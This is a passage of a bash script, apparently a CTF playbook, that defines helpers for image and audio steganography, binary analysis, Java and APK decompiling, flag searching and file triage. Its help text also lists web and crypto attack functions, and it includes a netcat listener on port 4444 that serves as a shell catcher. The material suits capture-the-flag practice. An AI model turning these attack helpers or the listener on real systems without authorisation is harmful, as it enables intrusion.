lsb = ''.join(str(p[0] & 1) for p in pixels[:$CTF_STEGO_LSB_MAX_PIXELS])
chars = [chr(int(lsb[i:i+8], 2)) for i in range(0, len(lsb)-7, 8)]
text = ''.join(chars)
if any(w in text.lower() for w in ['flag', 'ctf', 'key', '{']):
    print(f"  [!] LSB RED PLANE: {text[:200]}")
PYEOF
}

ctf_stego_image() {
    local image="$1"
    if [ -z "$image" ]; then
        echo "[CTF-STEGO] Usage: ctf_stego_image <image_file>"
        return 1
    fi
    echo "[CTF-STEGO] === IMAGE STEGANOGRAPHY ==="
    local outdir=$(scan_dir "CTF-Stego-Image" "$image")
    mkdir -p "$outdir"

    echo "[CTF-STEGO] [1/7] File analysis..."
    _stego_img_file_info "$image" "$outdir"

    echo "[CTF-STEGO] [2/7] Strings in image..."
    _stego_img_strings "$image" "$outdir"

    echo "[CTF-STEGO] [3/7] EXIF metadata..."
    _stego_img_exif "$image" "$outdir"

    echo "[CTF-STEGO] [4/7] Steghide (empty password)..."
    _stego_img_steghide "$image" "$outdir"

    echo "[CTF-STEGO] [5/7] Stegseek (dictionary attack)..."
    _stego_img_stegseek "$image" "$outdir"

    echo "[CTF-STEGO] [6/7] zsteg (PNG LSB)..."
    _stego_img_zsteg "$image" "$outdir"

    echo "[CTF-STEGO] [7/7] Binwalk embedded files..."
    _stego_img_binwalk "$image" "$outdir"

    _stego_img_lsb_extract "$image"

    echo "[CTF-STEGO] Results: $outdir"
}

ctf_stego_audio() {
    local audio="$1"
    if [ -z "$audio" ]; then
        echo "[CTF-STEGO] Usage: ctf_stego_audio <audio_file>"
        return 1
    fi
    echo "[CTF-STEGO] === AUDIO STEGANOGRAPHY ==="
    local outdir=$(scan_dir "CTF-Stego-Audio" "$audio")
    mkdir -p "$outdir"

    echo "[CTF-STEGO] [1/5] File analysis..."
    file "$audio" > "$outdir/file-info.txt"
    ffprobe "$audio" 2>&1 > "$outdir/ffprobe.txt" || true

    echo "[CTF-STEGO] [2/5] Strings..."
    strings -n $CTF_STRINGS_MIN_LEN "$audio" | grep -iE 'flag|ctf|key|secret' > "$outdir/strings.txt"

    echo "[CTF-STEGO] [3/5] Binwalk..."
    if command -v binwalk &>/dev/null; then
        binwalk "$audio" > "$outdir/binwalk.txt" 2>/dev/null
        binwalk -e "$audio" -C "$outdir/extracted/" 2>/dev/null || true
    fi

    echo "[CTF-STEGO] [4/5] Spectrogram analysis..."
    if command -v sox &>/dev/null; then
        mkdir -p "$outdir/spectrograms"
        sox "$audio" -n spectrogram -o "$outdir/spectrograms/full.png" 2>/dev/null || true
        sox "$audio" -n spectrogram -x $CTF_STEGO_SPECTROGRAM_WIDTH -y $CTF_STEGO_SPECTROGRAM_HEIGHT -o "$outdir/spectrograms/hires.png" 2>/dev/null || true
        echo "  Spectrograms saved to: $outdir/spectrograms/"
    fi

    echo "[CTF-STEGO] [5/5] EXIF / metadata..."
    if command -v exiftool &>/dev/null; then
        exiftool "$audio" > "$outdir/metadata.txt" 2>/dev/null || true
    fi

    # Morse from silence/beep patterns
    echo "[CTF-STEGO] Hint: If you hear dots and dashes, it might be Morse code."
    echo "  Use: sox audio.wav -t raw -r $CTF_STEGO_AUDIO_SAMPLE_RATE - | head to inspect raw data"

    echo "[CTF-STEGO] Results: $outdir"
}


# ============================================================
# PWN / BINARY EXPLOITATION CTF
# Covers: Binary analysis, checksec, disassembly, shellcode
# ============================================================
# --- Pwn analysis helpers ---

_pwn_file_info() {
    local binary="$1" outdir="$2"
    file "$binary" > "$outdir/file-info.txt"
    readelf -h "$binary" > "$outdir/elf-header.txt" 2>/dev/null || true
}

_pwn_checksec() {
    local binary="$1" outdir="$2"
    if command -v checksec &>/dev/null; then
        checksec --file="$binary" > "$outdir/checksec.txt" 2>/dev/null || true
    fi
    python3 << PYEOF 2>/dev/null || true
import subprocess
result = subprocess.run(['readelf', '-l', '$binary'], capture_output=True, text=True)
for line in result.stdout.split('\n'):
    if 'GNU_STACK' in line:
        print(f"  Stack: {'EXECUTE' if 'RWE' in line else 'no-execute'}")
    if 'GNU_RELRO' in line:
        print(f"  RELRO: {'Full' if line.strip().startswith('0x') else 'Partial'}")
PYEOF
}

_pwn_symbols() {
    local binary="$1" outdir="$2"
    nm "$binary" 2>/dev/null | grep -iE ' T |flag|win|shell|exec|system|cat|get_flag' > "$outdir/symbols.txt" || true
    objdump -t "$binary" 2>/dev/null | grep -iE 'flag|win|shell|exec|system' >> "$outdir/symbols.txt" 2>/dev/null || true
}

_pwn_strings() {
    local binary="$1" outdir="$2"
    strings -n $CTF_STRINGS_MIN_LEN "$binary" | grep -iE 'flag|bin/sh|sh|cat|system|input|buffer|password|win|lose|correct|wrong' > "$outdir/interesting-strings.txt"
}

_pwn_disassemble() {
    local binary="$1" outdir="$2"
    objdump -d "$binary" | grep -A 30 '<main>:' > "$outdir/main-disasm.txt" 2>/dev/null || true
    for func in flag get_flag win shell system; do
        objdump -d "$binary" | grep -A 20 "<${func}>:" >> "$outdir/func-disasm.txt" 2>/dev/null || true
    done
}

ctf_pwn_analyze() {
    local binary="$1"
    if [ -z "$binary" ]; then
        echo "[CTF-PWN] Usage: ctf_pwn_analyze <binary>"
        return 1
    fi
    echo "[CTF-PWN] === BINARY ANALYSIS ==="
    local outdir=$(scan_dir "CTF-Pwn" "$binary")
    mkdir -p "$outdir"

    echo "[CTF-PWN] [1/5] File type..."
    _pwn_file_info "$binary" "$outdir"

    echo "[CTF-PWN] [2/5] Security properties (checksec)..."
    _pwn_checksec "$binary" "$outdir"

    echo "[CTF-PWN] [3/5] Symbols and functions..."
    _pwn_symbols "$binary" "$outdir"

    echo "[CTF-PWN] [4/5] Strings..."
    _pwn_strings "$binary" "$outdir"

    echo "[CTF-PWN] [5/5] Disassembly (main + flag-related)..."
    _pwn_disassemble "$binary" "$outdir"

    echo "[CTF-PWN] Results: $outdir"
}

ctf_pwn_disassemble() {
    local binary="$1"
    local func="${2:-main}"
    if [ -z "$binary" ]; then
        echo "[CTF-PWN] Usage: ctf_pwn_disassemble <binary> [function_name]"
        return 1
    fi
    echo "[CTF-PWN] === DISASSEMBLY: $func ==="

    # Try objdump
    echo "--- objdump ---"
    objdump -d "$binary" | sed -n "/<${func}>:/,/^$/p" 2>/dev/null || echo "  Function not found with objdump"

    # Try r2
    if command -v r2 &>/dev/null; then
        echo "--- radare2 ---"
        r2 -q -e "bin.cache=true" -c "aaa; pdf @ sym.${func}" "$binary" 2>/dev/null || true
    fi

    # Try Ghidra headless
    if command -v analyzeHeadless &>/dev/null; then
        echo "[CTF-PWN] Ghidra headless decompile available:"
        echo "  analyzeHeadless /tmp/ghidra_proj proj -import $binary -postScript decompile.java"
    fi
}


# ============================================================
# REVERSE ENGINEERING CTF
# Covers: Java, Android, .NET, Python, general binary
# ============================================================
ctf_re_java() {
    local jar_file="$1"
    if [ -z "$jar_file" ]; then
        echo "[CTF-RE] Usage: ctf_re_java <jar_or_class_file>"
        return 1
    fi
    echo "[CTF-RE] === JAVA REVERSE ENGINEERING ==="
    local outdir=$(scan_dir "CTF-RE-Java" "$jar_file")
    mkdir -p "$outdir"

    echo "[CTF-RE] [1/3] Extract JAR..."
    mkdir -p "$outdir/extracted"
    cp "$jar_file" "$outdir/"
    cd "$outdir"
    unzip -o "$jar_file" -d extracted/ 2>/dev/null || true
    cd - > /dev/null

    echo "[CTF-RE] [2/3] Decompile with jd-gui / cfr..."
    if command -v jd-gui &>/dev/null; then
        echo "  Use: jd-gui $jar_file (GUI mode)"
    fi
    # CFR decompiler (headless)
    if [ ! -f /opt/opspectre/tools/cfr.jar ]; then
        wget -q -O /opt/opspectre/tools/cfr.jar \
            "https://github.com/leibnitz27/cfr/releases/download/0.152/cfr-0.152.jar" 2>/dev/null || true
    fi
    if [ -f /opt/opspectre/tools/cfr.jar ]; then
        java -jar /opt/opspectre/tools/cfr.jar "$jar_file" > "$outdir/decompiled.java" 2>/dev/null || true
        echo "  Decompiled: $outdir/decompiled.java"
    fi

    echo "[CTF-RE] [3/3] Search for flag/key patterns..."
    grep -riE 'flag|key|secret|encrypt|decrypt|check|verify|password' \
        "$outdir/extracted/" "$outdir/decompiled.java" 2>/dev/null > "$outdir/interesting.txt" || true

    echo "[CTF-RE] Results: $outdir"
}

ctf_re_apk() {
    local apk="$1"
    if [ -z "$apk" ]; then
        echo "[CTF-RE] Usage: ctf_re_apk <apk_file>"
        return 1
    fi
    echo "[CTF-RE] === ANDROID APK REVERSE ENGINEERING ==="
    local outdir=$(scan_dir "CTF-RE-APK" "$apk")
    mkdir -p "$outdir"

    echo "[CTF-RE] [1/3] APKTool decode..."
    if command -v apktool &>/dev/null; then
        apktool d "$apk" -o "$outdir/decoded" -f 2>/dev/null || true
        echo "  Decoded APK: $outdir/decoded/"
    fi

    echo "[CTF-RE] [2/3] Strings analysis..."
    strings -n $CTF_STRINGS_MIN_LEN "$apk" | grep -iE 'flag|key|secret|password|api|token' > "$outdir/strings.txt"

    echo "[CTF-RE] [3/3] Search source/smali for flag patterns..."
    find "$outdir/decoded/" -type f \( -name "*.java" -o -name "*.smali" -o -name "*.xml" \) \
        -exec grep -liE 'flag|key|secret|encrypt|check' {} \; 2>/dev/null > "$outdir/flag-files.txt" || true

    echo "[CTF-RE] Results: $outdir"
}


# ============================================================
# MISC / UTILITY CTF FUNCTIONS
# ============================================================
ctf_fetch_challenge() {
    local url="$1"
    local dest="${2:-$CTF_WORKSPACE}"
    if [ -z "$url" ]; then
        echo "[CTF-MISC] Usage: ctf_fetch_challenge <url> [output_dir]"
        return 1
    fi
    mkdir -p "$dest"
    echo "[CTF-MISC] Fetching challenge files from: $url"
    wget -r -np -nH --cut-dirs=0 -A "*.zip,*.tar,*.tar.gz,*.tgz,*.7z,*.rar,*.py,*.c,*.cpp,*.txt,*.bin,*.exe,*.elf,*.pcap,*.png,*.jpg,*.wav,*.mp3" \
        -P "$dest" "$url" 2>/dev/null
    echo "[CTF-MISC] Files saved to: $dest"
}

ctf_netcat_listener() {
    local port="${1:-$CTF_NETCAT_DEFAULT_PORT}"
    echo "[CTF-MISC] Starting netcat listener on port $port..."
    echo "[CTF-MISC] Ctrl+C to stop"
    rlwrap nc -lvnp "$port"
}

ctf_quick_flag_search() {
    local target="${1:-.}"
    echo "[CTF-MISC] === QUICK FLAG SEARCH ==="
    echo "[CTF-MISC] Searching for flag patterns in: $target"

    grep -rnoE '(FLAG|flag|CTF|ctf)\{[A-Za-z0-9_@!-]+\}' "$target" 2>/dev/null
    grep -rnoE '(FLAG|flag|CTF|ctf)\[[A-Za-z0-9_@!-]+\]' "$target" 2>/dev/null
    grep -rnoE '(FLAG|flag|CTF|ctf):[A-Za-z0-9_@!-]+' "$target" 2>/dev/null

    # Also search in binary strings
    find "$target" -type f -exec strings -n 8 {} + 2>/dev/null | grep -oE '(FLAG|flag|CTF|ctf)\{[A-Za-z0-9_@!-]+\}'

    echo "[CTF-MISC] Done."
}


# ============================================================
# FULL CTF WORKFLOW - RUN COMMON CHECKS ON A FILE
# ============================================================
ctf_quick_triage() {
    local file="$1"
    if [ -z "$file" ]; then
        echo "[CTF] Usage: ctf_quick_triage <file>"
        return 1
    fi
    echo "[CTF] ============================================"
    echo "[CTF] QUICK TRIAGE: $file"
    echo "[CTF] ============================================"

    # File type
    echo ""
    echo "--- FILE TYPE ---"
    file "$file"
    file -i "$file"

    # First bytes
    echo ""
    echo "--- FIRST 64 BYTES (hex) ---"
    xxd -l $CTF_TRIAGE_HEX_PREVIEW_BYTES "$file"

    # Interesting strings
    echo ""
    echo "--- INTERESTING STRINGS ---"
    strings -n $CTF_STRINGS_MIN_LEN "$file" | grep -iE 'flag|ctf|key|secret|hint|password|encrypt|decrypt' || echo "  (none found)"

    # Quick flag search
    echo ""
    echo "--- FLAG PATTERN SEARCH ---"
    strings "$file" | grep -oE '[A-Za-z0-9_]+\{[A-Za-z0-9_@!-]+\}' || echo "  (none found)"

    # Hidden data
    echo ""
    echo "--- HIDDEN DATA CHECK ---"
    if command -v binwalk &>/dev/null; then
        binwalk "$file" 2>/dev/null | head -10
    fi

    echo ""
    echo "[CTF] ============================================"
    echo "[CTF] Recommendations based on file type:"
    local ftype=$(file -b "$file")
    case "$ftype" in
        *ELF*|*executable*)  echo "  → ctf_pwn_analyze $file" ;;
        *PNG*|*JPEG*|*GIF*)  echo "  → ctf_stego_image $file" ;;
        *WAV*|*MP3*|*audio*) echo "  → ctf_stego_audio $file" ;;
        *PDF*)               echo "  → strings $file | grep flag; pdfimages $file" ;;
        *Zip*|*gzip*)        echo "  → unzip/untar and re-triage" ;;
        *pcap*|*capture*)    echo "  → ctf_forensics_pcap $file" ;;
        *Java*|*jar*)        echo "  → ctf_re_java $file" ;;
        *Android*)           echo "  → ctf_re_apk $file" ;;
        *Python*)            echo "  → python3 $file; pycdc if compiled" ;;
        *)                   echo "  → ctf_forensics_analyze $file" ;;
    esac
    echo "[CTF] ============================================"
}

# ============================================================
# QUICK REFERENCE
# ============================================================
ctf_help() {
    cat << 'HELPMSG'
=== CTF PLAYBOOK ===

TRIAGE & UTILITY:
  ctf_quick_triage <file>           - Auto-detect challenge type & recommend
  ctf_fetch_challenge <url> [dir]   - Download challenge files
  ctf_quick_flag_search <dir>       - Recursive flag pattern search
  ctf_netcat_listener [port]        - Start nc listener (default: 4444)

WEB:
  ctf_web_sqli <url>                - SQL Injection (union, blind, tamper)
  ctf_web_xss <url>                 - XSS (dalfox, fuzzing, polyglots)
  ctf_web_ssti <url>                - Server-Side Template Injection
  ctf_web_lfi_rfi <url>             - Local/Remote File Inclusion
  ctf_web_command_injection <url>   - OS Command Injection
  ctf_web_jwt <token_or_url>        - JWT attacks (crack, alg confusion)

CRYPTO:
  ctf_crypto_identify <input>       - Identify hash/encoding type
  ctf_crypto_rsa <n> [e] <c>        - RSA attacks (factor, Fermat, small-d)
  ctf_crypto_xor <hex> [key]        - XOR brute force & analysis
  ctf_crypto_caesar <text>          - Caesar cipher (all 26 shifts)
  ctf_crypto_vigenere <text> [key]  - Vigenère cipher decrypt
  ctf_crypto_encoding <text>        - Multi-decoder (b64, hex, rot13, morse...)

FORENSICS:
  ctf_forensics_analyze <file>      - Full file analysis (strings, meta, carve)
  ctf_forensics_pcap <file>         - PCAP analysis (HTTP, DNS, extract files)

STEGANOGRAPHY:
  ctf_stego_image <image>           - Image stego (steghide, LSB, binwalk, zsteg)
  ctf_stego_audio <audio>           - Audio stego (spectrogram, strings, binwalk)

PWN / EXPLOITATION:
  ctf_pwn_analyze <binary>          - Binary analysis (checksec, symbols, strings)
  ctf_pwn_disassemble <bin> [func]  - Disassemble with objdump/r2

REVERSE ENGINEERING:
  ctf_re_java <jar>                 - Java decompile (CFR)
  ctf_re_apk <apk>                  - Android APK decode (apktool + grep)

DEPENDENCIES (pre-installed in sandbox):
  pwntools, z3-solver, volatility3, steghide, stegseek, zsteg,
  sox, imagemagick, exiftool, foremost, binwalk

EXAMPLES:
  ctf_quick_triage challenge.zip
  ctf_web_sqli "http://ctf.example.com/login?id=1"
  ctf_crypto_rsa 3233 65537 2790
  ctf_crypto_encoding "ZmxhZ3t0aGlzX2lzX2l0fQ=="
  ctf_stego_image suspicious.png
  ctf_forensics_pcap capture.pcap

FILES:
  $CTF_OUTPUT_DIR/    - All CTF scan/extraction results
  $CTF_WORKSPACE/     - Working directory for scripts/extraction
HELPMSG
}

# ALIASES
alias ctftriage='ctf_quick_triage'
alias ctfflag='ctf_quick_flag_search'
alias ctffetch='ctf_fetch_challenge'
alias ctfhelp='ctf_help'
alias ctfnc='ctf_netcat_listener'
alias ctfsqli='ctf_web_sqli'
alias ctxsxss='ctf_web_xss'
alias ctxssti='ctf_web_ssti'
alias ctxlfi='ctf_web_lfi_rfi'
alias ctxcmd='ctf_web_command_injection'
alias ctxjwt='ctf_web_jwt'
alias crid='ctf_crypto_identify'
alias crsa='ctf_crypto_rsa'
alias cxor='ctf_crypto_xor'
alias ccaesar='ctf_crypto_caesar'
alias cvig='ctf_crypto_vigenere'
alias cenc='ctf_crypto_encoding'
alias cfor='ctf_forensics_analyze'
alias cpcap='ctf_forensics_pcap'
alias csteg='ctf_stego_image'
alias cstegaudio='ctf_stego_audio'
alias cpwn='ctf_pwn_analyze'
alias cdisasm='ctf_pwn_disassemble'

echo "[CTF] Playbook loaded. Type 'ctfhelp' for all commands."
